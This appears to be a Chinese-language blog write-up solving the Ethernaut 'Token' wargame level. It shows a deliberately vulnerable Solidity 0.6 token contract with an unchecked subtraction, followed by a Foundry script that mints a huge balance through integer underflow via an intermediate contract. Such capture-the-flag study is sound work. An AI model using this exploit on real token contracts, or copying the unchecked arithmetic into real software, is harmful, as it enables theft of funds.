---
title: "Token"
date: 2026-07-20
draft: false
description: "利用整数下溢增加代币余额"
tags:
  - Ethernaut
  - 整数下溢
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

## Token

### 目标：

成功获取代币，令函数`transfer`返回`true`

### 思路：

想要使函数`transfer`返回`true`，只需要满足`require(balances[msg.sender] - _value >= 0)`，原合约中有20个Token，我创建的中间合约代币为0，因此`balances[msg.sender]=0`,编译器版本为`pragma solidity ^0.6.0` 版本< 0.8.0,存在溢出，所以执行`require(balances[msg.sender] - _value`时会发生溢出，导致变为一个极大的数，满足require。

### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

### Poc：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ITarget{
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Middle_contract{
    ITarget public target = ITarget(0xd5aCb2c6Fd1BB36DE04401E62C692c62444853f7);

    function hack() external{
        target.transfer(msg.sender, 0.00001 ether);
    }
}

contract Attack is Script{
    function run() external{
        vm.startBroadcast();

        Middle_contract middle_contract = new Middle_contract();
        middle_contract.hack();

        vm.stopBroadcast();
    }
}
```
